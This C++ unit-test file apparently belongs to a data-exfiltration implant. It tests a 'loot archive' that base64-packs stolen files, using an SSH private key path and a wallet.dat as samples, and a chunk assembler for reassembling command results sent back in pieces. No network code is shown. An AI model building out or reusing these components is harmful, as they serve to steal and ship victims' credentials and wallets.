#include "ChunkAssembler.hpp"
#include "LootArchive.hpp"

#include <cassert>
#include <iostream>
#include <string>
#include <vector>

namespace {

int g_failures = 0;

void expect(bool condition, const char* message) {
    if (!condition) {
        std::cerr << "FAIL: " << message << '\n';
        ++g_failures;
    }
}

void test_loot_archive_round_trip() {
    std::vector<loot_archive::LootFileEntry> files;
    loot_archive::LootFileEntry first;
    first.path = "/home/user/.ssh/id_rsa";
    first.data = {'s', 'e', 'c', 'r', 'e', 't'};
    files.push_back(first);

    loot_archive::LootFileEntry second;
    second.path = "/home/user/wallet.dat";
    second.data = {1, 2, 3, 4, 5};
    files.push_back(second);

    const auto encoded = loot_archive::encode_base64_archive(files);
    const auto decoded = loot_archive::decode_base64_archive(encoded);
    expect(decoded.has_value(), "loot archive decode should succeed");
    if (!decoded) {
        return;
    }

    expect(decoded->size() == 2, "loot archive should contain two files");
    expect((*decoded)[0].path == first.path, "first loot path mismatch");
    expect((*decoded)[0].data == first.data, "first loot data mismatch");
    expect((*decoded)[1].path == second.path, "second loot path mismatch");
    expect((*decoded)[1].data == second.data, "second loot data mismatch");
}

void test_chunk_assembler() {
    ResultDAO chunk0;
    chunk0.command_uid = "cmd-1";
    chunk0.chunk_index = 0;
    chunk0.chunk_total = 2;
    chunk0.data = "hello";

    ResultDAO chunk1;
    chunk1.command_uid = "cmd-1";
    chunk1.chunk_index = 1;
    chunk1.chunk_total = 2;
    chunk1.data = " world";

    const auto assembled = chunk_assembler::assemble({chunk1, chunk0}, 2);
    expect(assembled.has_value(), "chunk assembly should succeed");
    if (!assembled) {
        return;
    }

    expect(assembled->data == "hello world", "assembled payload mismatch");
    expect(assembled->chunk_total == 1, "assembled result should be final");
}

void test_base64_round_trip() {
    const std::vector<unsigned char> input = {0x00, 0xFF, 0x10, 0x20, 0x30};
    const auto encoded = loot_archive::encode_base64(input);
    const auto decoded = loot_archive::decode_base64(encoded);
    expect(decoded.has_value(), "base64 decode should succeed");
    if (!decoded) {
        return;
    }
    expect(*decoded == input, "base64 round trip mismatch");
}

} // namespace

int main() {
    test_loot_archive_round_trip();
    test_chunk_assembler();
    test_base64_round_trip();

    if (g_failures == 0) {
        std::cout << "All exfil unit tests passed\n";
        return 0;
    }

    std::cerr << g_failures << " test(s) failed\n";
    return 1;
}
